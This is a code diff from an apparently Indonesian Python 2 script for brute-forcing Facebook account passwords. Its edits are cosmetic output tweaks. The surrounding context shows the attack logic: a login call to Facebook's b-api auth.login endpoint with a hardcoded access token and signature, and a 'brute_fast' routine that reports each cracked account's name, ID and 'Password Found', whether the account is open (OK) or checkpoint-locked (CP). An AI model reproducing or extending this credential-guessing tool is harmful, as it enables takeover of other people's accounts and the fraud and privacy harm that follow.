@@ -47,6 +47,7 @@ def login():
             banner()
             print
             print h+" ["+a+"✓"+h+"]"+p+" Login Akun Facebook"
+            print d+35*"+"
 	    username = raw_input(p+" ["+m+"∆"+p+"]"+a+" Username"+d+" : ")                            
             password = raw_input(m+" ["+p+"∆"+m+"]"+a+" Password"+d+" : ")
 	    urldev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+username+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -123,20 +124,20 @@ def brute_fast():
                     dev = json.loads(Dev_ID.text)
                     if "access_token" in dev:
                         print "\n \n"
-                        runn("          Success...")
+                        runn(a+"          Success...")
                         print
-                        print a+" ["+p+"OK✓"+a+"]"+h+" Name Facebook  : "+p+ nam
-                        print a+" ["+p+"OK✓"+a+"]"+h+" Usernmame / ID : "+p+ email
-                        print a+" ["+p+"OK✓"+a+"]"+h+" Password Found : "+p+ pas
+                        print a+" ["+p+"OK"+a+"]"+h+" Name Facebook  : "+p+ nam
+                        print a+" ["+p+"OK"+a+"]"+h+" Usernmame / ID : "+p+ email
+                        print a+" ["+p+"OK"+a+"]"+h+" Password Found : "+p+ pas
                         sys.exit()
 
                     elif "www.facebook.com" in dev["error_msg"]:
                         print "\n \n"
-                        runn("          Success...")
+                        runn(a+"          Success...")
                         print
-                        print a+" ["+k+"CP✓"+a+"]"+h+" Name Facebook  : "+k+ nam
-                        print a+" ["+k+"CP✓"+a+"]"+h+" Usernmame / ID : "+k+ email
-                        print a+" ["+k+"CP✓"+a+"]"+h+" Password Found : "+k+ pas
+                        print a+" ["+k+"CP"+a+"]"+h+" Name Facebook  : "+k+ nam
+                        print a+" ["+k+"CP"+a+"]"+h+" Usernmame / ID : "+k+ email
+                        print a+" ["+k+"CP"+a+"]"+h+" Password Found : "+k+ pas
                         sys.exit()
 
                     else:
